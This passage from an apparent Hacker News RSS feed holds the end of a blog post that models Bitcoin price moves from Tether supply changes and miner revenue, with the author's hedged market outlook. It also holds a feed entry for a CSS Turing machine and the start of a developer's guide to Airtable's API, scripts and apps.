<p>First, we will look at USDT supply changes over time. The way that Tether is supposed to work according to the original <a href="https://tether.to/wp-content/uploads/2016/06/TetherWhitePaper.pdf">Tether white paper </a>is that Tethers are created when people buy USDT with USD and Tethers are destroyed when people redeem USDT for USD. Therefore, the only way for the total supply of USDT to grow is for the amount of USDT buyers to be greater than the amount of USDT sellers. </p>



<figure><img loading="lazy" width="656" height="569" src="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/tether-flows.png?resize=656%2C569&amp;ssl=1" alt="" srcset="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/tether-flows.png?w=901&amp;ssl=1 901w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/tether-flows.png?resize=300%2C260&amp;ssl=1 300w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/tether-flows.png?resize=768%2C667&amp;ssl=1 768w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"><figcaption>Source: Tether White Paper</figcaption></figure>



<p>You can easily model Tether flows by looking at the growth or decline in USDT supply over time. When USDT supply is growing that means there are net inflows into Tether, and when USDT supply is declining that means there are net outflows from Tether. </p>



<p>Unfortunately, as far as I know, Coingecko does not provide USDT Supply data directly so I had to indirectly calculate it with USDT market cap / USDT price. As I stated in my last post, their USDT price is calculated in a complicated manner, so it may cause some irregularities in the data. Here is USDT supply over time.</p>



<figure><a href="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/USDT-Supply-Over-Time.jpg?ssl=1"><img loading="lazy" width="656" height="438" src="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/USDT-Supply-Over-Time.jpg?resize=656%2C438&amp;ssl=1" alt="" srcset="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/USDT-Supply-Over-Time.jpg?resize=1024%2C683&amp;ssl=1 1024w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/USDT-Supply-Over-Time.jpg?resize=300%2C200&amp;ssl=1 300w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/USDT-Supply-Over-Time.jpg?resize=768%2C512&amp;ssl=1 768w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/USDT-Supply-Over-Time.jpg?w=1200&amp;ssl=1 1200w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></a></figure>



<p>To properly look at flows, you should graph the net increase or decrease over time. You can look at flows on a daily basis with USDT supply – USDT supply 1 day ago:</p>



<figure><a href="https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-1.jpg?ssl=1"><img loading="lazy" width="656" height="328" src="https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-1.jpg?resize=656%2C328&amp;ssl=1" alt="" srcset="https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-1.jpg?resize=1024%2C512&amp;ssl=1 1024w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-1.jpg?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-1.jpg?resize=768%2C384&amp;ssl=1 768w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-1.jpg?resize=1536%2C768&amp;ssl=1 1536w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-1.jpg?w=1600&amp;ssl=1 1600w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-1.jpg?w=1312&amp;ssl=1 1312w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></a></figure>



<p>Or you can look at flows on a longer time frame basis. Here is a chart of USDT supply – USDT supply 30 days ago:</p>



<figure><a href="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-30-days-1.jpg?ssl=1"><img loading="lazy" width="656" height="328" src="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-30-days-1.jpg?resize=656%2C328&amp;ssl=1" alt="" srcset="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-30-days-1.jpg?resize=1024%2C512&amp;ssl=1 1024w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-30-days-1.jpg?resize=300%2C150&amp;ssl=1 300w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-30-days-1.jpg?resize=768%2C384&amp;ssl=1 768w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-30-days-1.jpg?resize=1536%2C768&amp;ssl=1 1536w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-30-days-1.jpg?w=1600&amp;ssl=1 1600w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-30-days-1.jpg?w=1312&amp;ssl=1 1312w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></a></figure>



<p>You can then try to predict future Bitcoin prices based on these flows.</p>



<figure><a href="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-Bitcoin-price.jpg?ssl=1"><img loading="lazy" width="656" height="328" src="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-Bitcoin-price.jpg?resize=656%2C328&amp;ssl=1" alt="" srcset="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-Bitcoin-price.jpg?resize=1024%2C512&amp;ssl=1 1024w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-Bitcoin-price.jpg?resize=300%2C150&amp;ssl=1 300w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-Bitcoin-price.jpg?resize=768%2C384&amp;ssl=1 768w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-Bitcoin-price.jpg?resize=1536%2C768&amp;ssl=1 1536w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-Bitcoin-price.jpg?w=1600&amp;ssl=1 1600w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-Bitcoin-price.jpg?w=1312&amp;ssl=1 1312w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></a></figure>



<p>You can clearly see that large USDT supply increases precede several large increases in Bitcoin price and several large USDT supply decreases precede drops in Bitcoin price. Below is a table of Pearson Correlation Coefficients or R values showing change in USDT supply over a period of days vs future Bitcoin returns since 1/1/2018.</p>



<figure><img loading="lazy" width="656" height="120" src="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/usdt-model-correlation-matrix.png?resize=656%2C120&amp;ssl=1" alt="" srcset="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/usdt-model-correlation-matrix.png?resize=1024%2C188&amp;ssl=1 1024w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/usdt-model-correlation-matrix.png?resize=300%2C55&amp;ssl=1 300w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/usdt-model-correlation-matrix.png?resize=768%2C141&amp;ssl=1 768w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/usdt-model-correlation-matrix.png?w=1146&amp;ssl=1 1146w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></figure>



<p>You will notice that Tether flows have a low correlation to very short term price predictions, but high correlation to longer term predictions.</p>



<p>Now that we know that USDT printing is bullish and that USDT destruction is bearish for Bitcoin, it would be nice to know when Tether plans on printing or destroying USDT before it happens. You might think this is completely up to those in charge at Bitfinex, however, they are not immune from market forces. As I mentioned in my last post <a href="https://sellthedip.com/a-more-accurate-tether-price-history-chart/">https://sellthedip.com/a-more-accurate-tether-price-history-chart/</a> the CoinbaseBTC/BitfinexBTC price is a good proxy for the true price of USDT. When the CoinbaseBTC/BitfinexBTC price is stable and &gt;=1, it is safe to assume they will continue to print and it is bullish for Bitcoin.  When the CoinbaseBTC/BitfinexBTC price is &lt;1, it is safe to assume that Tether and Bitfinex will be forced to destroy USDT. This is bearish for Bitcoin. You can see this by charting the daily change in USDT supply vs the USDT price over time.</p>



<figure><a href="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-USDT-price.jpg?ssl=1"><img loading="lazy" width="656" height="328" src="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-USDT-price.jpg?resize=656%2C328&amp;ssl=1" alt="" srcset="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-USDT-price.jpg?resize=1024%2C512&amp;ssl=1 1024w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-USDT-price.jpg?resize=300%2C150&amp;ssl=1 300w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-USDT-price.jpg?resize=768%2C384&amp;ssl=1 768w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-USDT-price.jpg?resize=1536%2C768&amp;ssl=1 1536w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-USDT-price.jpg?w=1600&amp;ssl=1 1600w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Change-in-USDT-supply-over-last-1-days-and-USDT-price.jpg?w=1312&amp;ssl=1 1312w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></a></figure>



<figure><img loading="lazy" width="656" height="328" src="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitcoin-price-over-time.jpg?resize=656%2C328&amp;ssl=1" alt="" srcset="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitcoin-price-over-time.jpg?resize=1024%2C512&amp;ssl=1 1024w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitcoin-price-over-time.jpg?resize=300%2C150&amp;ssl=1 300w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitcoin-price-over-time.jpg?resize=768%2C384&amp;ssl=1 768w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitcoin-price-over-time.jpg?resize=1536%2C768&amp;ssl=1 1536w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitcoin-price-over-time.jpg?w=1600&amp;ssl=1 1600w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Bitcoin-price-over-time.jpg?w=1312&amp;ssl=1 1312w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></figure>



<p>You can learn a lot from these charts. Sometimes printing too much USDT crashes the price of USDT. Sometimes USDT is destroyed after the price of USDT gets too low. The USDT price dropping below 1 for a sustained period of time (as it did in late 2018) prevents Tether from printing USDT and sometimes even forces Tether to destroy USDT. Destroying USDT has two effects: 1) It reduces the total supply of USDT in an attempt to increase the price of USDT, and 2) It crashes the price of BTC. It’s important to look at the price of USDT over time because it is a leading indicator of USDT being destroyed,  which in turn is a leading indicator of Bitcoin crashing.</p>



<p><strong>Miner Revenue</strong></p>



<p>Next, we will look at Bitcoin miner revenue.</p>



<figure><a href="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Daily-Miner-Revenue-and-Bitcoin-Price-Over-Time-2.jpg?ssl=1"><img loading="lazy" width="656" height="328" src="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Daily-Miner-Revenue-and-Bitcoin-Price-Over-Time-2.jpg?resize=656%2C328&amp;ssl=1" alt="" srcset="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Daily-Miner-Revenue-and-Bitcoin-Price-Over-Time-2.jpg?resize=1024%2C512&amp;ssl=1 1024w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Daily-Miner-Revenue-and-Bitcoin-Price-Over-Time-2.jpg?resize=300%2C150&amp;ssl=1 300w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Daily-Miner-Revenue-and-Bitcoin-Price-Over-Time-2.jpg?resize=768%2C384&amp;ssl=1 768w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Daily-Miner-Revenue-and-Bitcoin-Price-Over-Time-2.jpg?resize=1536%2C768&amp;ssl=1 1536w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Daily-Miner-Revenue-and-Bitcoin-Price-Over-Time-2.jpg?w=1600&amp;ssl=1 1600w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Daily-Miner-Revenue-and-Bitcoin-Price-Over-Time-2.jpg?w=1312&amp;ssl=1 1312w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></a></figure>



<p>Bitcoin miners are net sellers of Bitcoin. They receive their payment in Bitcoin, but they pay their energy bills in fiat. In order to cover their expenses, they have to sell almost all the Bitcoin they receive as revenue for fiat. These miners provide a valuable service to the Bitcoin network by processing transactions and securing the network, but make no mistake about it, the more revenue they receive, the more selling pressure and negative flows it creates for Bitcoin. You can see in the chart that every time there is a large spike in Bitcoin price, Miner Revenue also spikes, and then Bitcoin price declines.</p>



<p>Theoretically, I don’t think Miner Revenue should provide much, if any, predictive power to Bitcoin price anymore than gold miner revenue predicts future gold prices. However, what I believe is currently happening is that enough USDT is being printed to offset what should be very bearish, huge Miner Revenue flows.</p>



<figure><img loading="lazy" width="656" height="438" src="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Cumulative-USDT-printed-and-cumulative-mining-revenue.jpg?resize=656%2C438&amp;ssl=1" alt="" srcset="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Cumulative-USDT-printed-and-cumulative-mining-revenue.jpg?resize=1024%2C683&amp;ssl=1 1024w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Cumulative-USDT-printed-and-cumulative-mining-revenue.jpg?resize=300%2C200&amp;ssl=1 300w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Cumulative-USDT-printed-and-cumulative-mining-revenue.jpg?resize=768%2C512&amp;ssl=1 768w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Cumulative-USDT-printed-and-cumulative-mining-revenue.jpg?w=1200&amp;ssl=1 1200w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></figure>



<p>This is why exponentially more USDT has to be printed to keep the price of Bitcoin increasing. The higher the price of Bitcoin goes, the higher Miner Revenue goes, and the more Tether needs to be printed to offset those flows.</p>



<p>To finish the incomplete Bitcoin Flows model, you can subtract Miner Revenue from changes in USDT supply over a trailing number of days.</p>



<figure><a href="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-1-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-2.jpg?ssl=1"><img loading="lazy" width="656" height="328" src="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-1-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-2.jpg?resize=656%2C328&amp;ssl=1" alt="" srcset="https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-1-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-2.jpg?resize=1024%2C512&amp;ssl=1 1024w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-1-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-2.jpg?resize=300%2C150&amp;ssl=1 300w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-1-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-2.jpg?resize=768%2C384&amp;ssl=1 768w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-1-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-2.jpg?resize=1536%2C768&amp;ssl=1 1536w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-1-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-2.jpg?w=1600&amp;ssl=1 1600w, https://i1.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-1-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-2.jpg?w=1312&amp;ssl=1 1312w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></a></figure>



<figure><a href="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-7-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?ssl=1"><img loading="lazy" width="656" height="328" src="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-7-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?resize=656%2C328&amp;ssl=1" alt="" srcset="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-7-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?resize=1024%2C512&amp;ssl=1 1024w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-7-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?resize=300%2C150&amp;ssl=1 300w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-7-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?resize=768%2C384&amp;ssl=1 768w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-7-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?resize=1536%2C768&amp;ssl=1 1536w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-7-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?w=1600&amp;ssl=1 1600w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-7-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?w=1312&amp;ssl=1 1312w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></a></figure>



<figure><a href="https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-30-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?ssl=1"><img loading="lazy" width="656" height="328" src="https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-30-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?resize=656%2C328&amp;ssl=1" alt="" srcset="https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-30-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?resize=1024%2C512&amp;ssl=1 1024w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-30-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-30-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?resize=768%2C384&amp;ssl=1 768w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-30-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?resize=1536%2C768&amp;ssl=1 1536w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-30-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?w=1600&amp;ssl=1 1600w, https://i0.wp.com/sellthedip.com/wp-content/uploads/2021/01/Last-30-Day-Bitcoin-Flows-and-Bitcoin-Price-Over-Time-1.jpg?w=1312&amp;ssl=1 1312w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></a></figure>



<p>You can see that high Bitcoin Flows are usually lower in bear markets and generally higher in bull markets. You will also no doubt observe that current Bitcoin flows are very high, and this appears to be very bullish. Before you rush to buy Bitcoin on 10x leverage based on my charts, please remember a few things: </p>



<p>First, this model is incomplete because these flows are incomplete. <strong>The most important part of Bitcoin flows 1) USD buyers and USD sellers are not included.</strong> During early December 2017, there was clearly huge USD buyer demand and very little selling demand. By the end of the month, after prices had peaked, the flows had clearly reversed and there was huge selling pressure at highly elevated prices. What the crowd buys today, they may want to sell tomorrow. A declining ‘bitcoin’ google trends data following a massive spike, such as what we are currently experiencing, is undefeated in predicting a bear market. Ignore it at your own peril.</p>



<p>Second, looking at these flows and getting excited to invest is like looking at past fraudulent accounting statements for a company, seeing how well that stock has performed, and assuming it will continue in this way forever. Eventually, the crash comes and then the regulators step in and shut it down.</p>



<p>Additionally, looking at the Bitcoin flows charts above, take note that there is nothing special about the zero on the y-axis. In a typical day, the USD buying demand is probably higher than USD sellers by several million dollars worldwide which would shift all the flows slightly upward if you were to model USD demand that way.</p>



<p><strong>Bitcoin and the broader market</strong></p>



<p>The March 2020 stock market crash showed that Bitcoin is a “risk on” asset. Bitcoin crashed along with almost everything else. With increasing institutional demand comes increased correlation to other risky assets like stocks. Tether can print all they want, but they are not immune from macroeconomic forces. If the stock market crashes again, Bitcoin will certainly tumble with it. From mid February to mid March of 2020 Bitcoin crashed more than 60% from $10,500 to $4,000. Since the market lows, SPY is up ~200% while Bitcoin is up 1,300%. If returns are amplified on the way up, they will be amplified on the way down as well. Investing in Bitcoin at its current price level should provide similar returns as investing in Tesla stock, Apple calls or SPY calls. Conversely, shorting Bitcoin at these levels should provide similar returns as shorting Tesla stock or buying puts on Apple or SPY.</p>



<figure><img loading="lazy" width="656" height="402" src="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/spy-vs-btc.png?resize=656%2C402&amp;ssl=1" alt="" srcset="https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/spy-vs-btc.png?resize=1024%2C627&amp;ssl=1 1024w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/spy-vs-btc.png?resize=300%2C184&amp;ssl=1 300w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/spy-vs-btc.png?resize=768%2C470&amp;ssl=1 768w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/spy-vs-btc.png?w=1488&amp;ssl=1 1488w, https://i2.wp.com/sellthedip.com/wp-content/uploads/2021/01/spy-vs-btc.png?w=1312&amp;ssl=1 1312w" sizes="(max-width: 656px) 100vw, 656px" data-recalc-dims="1"></figure>



<p><strong>Is Bitcoin headed higher or lower?</strong></p>



<p>I have no idea. Please stop DMing me and asking me. These are the indicators that I look at:</p>



<ol><li>USDT Price or CoinbaseBTC/BitfinexBTC is <strong>bullish</strong>.</li><li>USDT Supply Changes is <strong>very</strong> <strong>bullish</strong>.</li><li>Miner Revenue is <strong>bearish</strong>, but more than offset by USDT supply increases.</li><li>Google Trends is <strong>neutral</strong>, but flashing warning signs of going very bearish any day now.</li><li>Stocks are <strong>bearish</strong> and overbought in the short and long term by almost any indicator you look at.</li><li>Government regulation is <strong>very bearish</strong> in the long term. Eventually Tether will get shutdown. I have no idea when.</li></ol>



<p>Overall, I am short term (days to weeks) bullish and long term (weeks to months) bearish on Bitcoin. It is way too early to short. I would wait for the USDT:USD 1:1 peg to break for a sustained period of time which would shutdown the Tether printer. It is also very risky to go long here. There is probably a little upside left in this bubble, but there is tremendous risk to the downside. 50k and 10k price targets are both likely to be hit in the near term. In the longer term, 100k and 5k are both quite possible.</p>



<p>If you found this post helpful, tips are always appreciated, but never expected. Best of luck and happy trading.</p>



<p>BTC: 37w2snDeY2DPVaxFYtUhsS6wzucbybTGvx</p>



<p>ETH: 0xD6b3F223d33AAaFbbFd3Ca52F5C12F021243F496</p>
			</div><!-- .entry-content -->

	<!-- .entry-footer -->

		<!-- .entry-auhtor -->
	</article></div>]]>
            </description>
            <link>https://sellthedip.com/will-bitcoin-will-go-up-or-down/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25782222</guid>
            <pubDate>Thu, 14 Jan 2021 20:44:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CSS Turing Machine]]>
            </title>
            <description>
<![CDATA[
Score 57 | Comments 19 (<a href="https://news.ycombinator.com/item?id=25782120">thread link</a>) | @mr_tyzic
<br/>
January 14, 2021 | https://brandondong.github.io/css-turing-machine/ | <a href="https://web.archive.org/web/*/https://brandondong.github.io/css-turing-machine/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://brandondong.github.io/css-turing-machine/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25782120</guid>
            <pubDate>Thu, 14 Jan 2021 20:37:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Complete Developer's Guide to Airtable]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25781916">thread link</a>) | @_acco
<br/>
January 14, 2021 | https://blog.syncinc.so/dev-guide | <a href="https://web.archive.org/web/*/https://blog.syncinc.so/dev-guide">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>You might have missed <a href="https://blog.airtable.com/airtable-platform-launch-automations-sync-apps/">the memo</a>: Airtable is ready for developers.</p><p>In the span of a year, Airtable went from a simple <a href="https://airtable.com/api">REST API</a> to now supporting <a href="https://airtable.com/developers/scripting">scripting</a>, a <a href="https://airtable.com/developers/apps">custom apps SDK</a>, built in <a href="https://support.airtable.com/hc/en-us/articles/360050974153-Automations-Overview">automations</a>, and a small but growing ecosystem of <a href="https://airtable.com/marketplace">third-party tools and services</a>.</p><p>As a developer looking to build on Airtable, where should you start? And what is the developer experience like?</p><p>This guide aims to help developers navigate Airtable and build great applications on this growing platform.</p><h2><em>In</em> or <em>on</em> Airtable?</h2><p>Who is your user and what do they need? This age-old question is still the first one to ask as you begin to consider which Airtable developer tools to use.</p><p>At a high-level, you can classify Airtable's suite of <a href="https://airtable.com/developers">developer tools</a> as either supporting use cases that happen inside the Airtable interface (i.e. <em>in</em> Airtable) or outside Airtable in another app or tool (i.e. <em>on</em> Airtable).</p><p><img src="https://blog.syncinc.so/dev-guide/031_in_or_on.png" alt="in or on diagram"></p><p>When you are building <em>in</em> Airtable, the user is logged into Airtable and using your software within the Airtable interface. For any code you want to run <em>in</em> Airtable you'll be using either scripts, automations, or the custom app SDK.</p><blockquote><p>Note: Yes, I know, automations can trigger actions outside of Airtable. But by and large, the end user is <em>in</em> Airtable.</p></blockquote><p>If you are building <em>on</em> Airtable, then you are building for users outside of Airtable. This might be a custom internal tool, a dashboard built in Google Data Studio, a public Next.js website, or inside another SaaS application all together. In these use cases, you'll be using the Airtable REST API directly or using a tool like the one I helped build - <a href="https://syncinc.so/?utm_source=blog&amp;utm_medium=post&amp;utm_campaign=at-dev-guide">Sync Inc</a>.</p><p>As you decide whether to build <em>in</em> on <em>on</em> Airtable, you should consider what <a href="https://airtable.com/pricing">Airtable plan</a> your users are on as well. The REST API is available on every plan to every Airtable user. Automations are available on every plan, but capped at different limits. Meanwhile, scripts and custom apps are only available on pro and enterprise plans.</p><p><img src="https://blog.syncinc.so/dev-guide/020_pricing.png" alt="pricing"></p><blockquote><p>Note: Airtable Apps were formerly known as <em>Airtable Blocks</em>. The new name is slowly catching on but you'll still see the term <em>blocks</em> pop up here and there.</p></blockquote><p>Lastly, as your considering whether to build <em>in</em> or <em>on</em> Airtable, consider the functionality you need. When building <em>in</em> Airtable, you will face a couple constraints when working with 3rd party APIs, caching data, or manipulating the UI.</p><h2>Airtable's data quirks</h2><p>It's worth touching on Airtable's data model.</p><p>From a developer's perspective, Airtable is basically a hosted database fused to an easy interface for creating and managing data. This easy-to-use interface means the database schema is super flexible. Tables, columns, and field types can emerge, change, or disappear at anytime. Airtable is highly valuable because of this flexibility, but it also makes developing on Airtable a bit more unpredictable.</p><p>Additionally, as a data store, Airtable supports all sorts of <a href="https://airtable.com/developers/scripting/api/cell_values">data types</a>. Most of these data types are familiar and predictable.</p><p>However, two of these data types - <code>lookups</code> and <code>formulas</code> - can take the form of any other type. This makes sense given how Airtable works: if a formula is concatenating text, then its result is a string. If it is summing numbers, then its result is a number. This means the data type of these fields is a black box, sort of like the <code>any</code> type in TypeScript.</p><p>As a #protip to deal with Airtable's data flexibility, I highly recommend developing on a "staging" copy of the Airtable base you are working with. This helps reduce the likelihood that an end user will change data as you build. And, of course, this allows you to break things, a hallmark of a great development process. Airtable can duplicate a base remarkably fast (especially when you think about what's happening under the hood!) - so use this to your advantage.</p><p><img src="https://blog.syncinc.so/dev-guide/021_duplicate.png" alt="duplicate"></p><p>So: Which of the many options should you use to build on Airtable? Let's first consider building <em>in</em> Airtable with Airtable scripts.</p><h2>Airtable scripts: little record robots</h2><p><a href="https://airtable.com/developers/scripting">Airtable scripts</a> are short JavaScript snippets that allow you to manipulate data in your Airtable base.</p><p>You can do just about anything to the data in your base that is made possible with the standard JavaScript library. There are a couple limits:</p><ol><li>You can't import other JS libraries. You can copy and paste smaller, minified libraries that fit into one file - but it's usually a stretch.</li><li>You can't touch the DOM.</li><li>You can't change the schema of the base. You can't, for example, create new tables or views.</li></ol><p>To use scripts, you need to add the <em>scripting app</em> (f.k.a <em>scripting block</em>) to your base. This means you need to be on either the Pro or Enterprise Airtable plans.</p><p>It's also worth noting that Airtable now allows developers to share (no selling yet!) scripts in the <a href="https://airtable.com/marketplace/category/scripts">Airtable marketplace</a>. So if you write a killer 